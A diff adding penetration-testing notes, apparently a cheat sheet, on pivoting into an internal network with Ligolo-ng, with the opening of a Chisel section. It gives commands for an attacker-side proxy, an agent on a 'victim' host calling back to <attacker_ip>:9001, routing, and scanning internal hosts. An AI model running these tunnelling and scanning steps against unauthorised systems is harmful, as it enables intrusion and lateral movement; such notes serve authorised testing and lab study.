@@ -1,3 +1,42 @@
+LIGOLO-NG
+
+Create and Enable a TUN Interface (Attacker)
+
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+Start Ligolo-ng Proxy Server (Attacker)
+
+./proxy -laddr 0.0.0.0:9001 -selfcert
+
+Upload and Start Agent on Target (Victim)
+
+./agent -connect <attacker_ip>:9001 -ignore-cert
+
+session
+
+Check Internal Subnet (Inside the Session)
+
+ifconfig
+
+Add Route to Internal Subnet (Attacker)
+
+sudo ip route add <subnet> dev ligolo
+# Example: sudo ip route add 10.10.0.0/24 dev ligolo
+
+Start the Tunnel (Proxy Console)
+
+start
+
+Begin Scanning or Using Internal Services
+
+nmap -Pn -p 445 10.10.0.5
+curl http://10.10.0.5
+smbclient -L 10.10.0.5
+
+
+CHISEL
+
 🔹 Step 1: Download Chisel
 Get it from: https://github.com/jpillora/chisel/releases
 
